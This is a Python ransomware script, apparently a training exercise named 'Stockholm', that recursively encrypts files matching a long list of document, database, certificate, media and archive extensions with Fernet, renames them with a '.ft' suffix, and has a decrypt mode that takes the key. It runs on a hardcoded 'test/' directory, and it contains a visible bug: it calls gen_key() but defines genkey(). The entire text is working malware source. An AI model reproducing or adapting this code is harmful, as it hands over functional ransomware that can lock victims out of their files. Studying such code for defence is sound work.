from cryptography.fernet import Fernet
import sys
import argparse
import os
import shutil

extensions = [
	'.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw',
	'.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif',
	'.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm',
	'.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb',
	'.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln',
	'.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat',
	'.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php',
	'.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla',
	'.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv',
	'.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd',
	'.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg',
	'.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak',
	'.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm',
	'.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1',
	'.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg',
	'.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot',
	'.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw',
	'.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb',
	'.docx', '.doc'
]
#cifrado simétrico AES (Advanced Encryption Standard)

parser = argparse.ArgumentParser(description='This program executes a ransomware virus in /home/infection')

parser.add_argument('-r', '--reverse', type=str, help='Decrypt all infected files')
parser.add_argument('-k', '--genkey', help='Generate encryption key')
parser.add_argument('-s', '--silent', action='store_true', help='Activate silent mode')
parser.add_argument('-v', '--version', action='store_true', help='Show version')
parser.add_argument('-d', '--savedir', type=str, help='Save unencripted files in a folder, must be specified')
args = parser.parse_args()	

def genkey():
	my_key = Fernet.generate_key()
	with open('cif.key', 'wb') as keyfile:
		keyfile.write(my_key)

def encript_file(filename):
	key = open('cif.key', 'rb').read()
	cyphr = Fernet(key)
	try:
		with open(filename, 'rb') as text:
			or_data = text.read()
		enc_data = cyphr.encrypt(or_data)
		if args.savedir:
			shutil.copy(filename, args.savedir)
		with open(filename, 'wb') as enc_file:
			enc_file.write(enc_data)
		if os.path.isfile(filename + '.ft'):
			os.rename(filename + '.ft', filename + '_1' + '.ft')
		os.rename(filename, filename + '.ft')
		if not args.silent:
			print(filename + " has been encrypted")
	except:
		pass
		
def unencript_file(name, key):
	if name.endswith('.ft') and not name.endswith('_1.ft'):
		try:
			cyphr = Fernet(key)
			with open(name, 'rb') as text:
				enc_data = text.read()
			or_data = cyphr.decrypt(enc_data)
			with open(name, 'wb') as or_file:
				or_file.write(or_data)
			os.rename(name, name[:len(name)-len('.ft')])
			if not args.silent:
				print(name[:len(name)-len('.ft')] + " has been decrypted")
		except:
			print("Invalid key or could not decrypt file")
	if name.endswith('_1.ft'):
		os.rename(name,  name[:len(name)-len('_1.ft')] + '.ft')


if args.savedir:
	if not os.path.exists(args.savedir):
		os.makedirs(args.savedir)
		print(f"Folder created")
if args.genkey:
	gen_key()

dirpath = 'test/'

def getfiles(dirpath):
	filelist = os.listdir(dirpath)
	for file_n in filelist:
		totalname = dirpath + file_n
		if os.path.isdir(totalname):
			getfiles(totalname + '/')
		if args.reverse:
			unencript_file(totalname, args.reverse)
		else:
			if not os.path.isdir(totalname):
				if totalname.endswith(tuple(extensions)):
					encript_file(totalname)
getfiles(dirpath)
if args.version:
	print("Stockholm Version 1.0")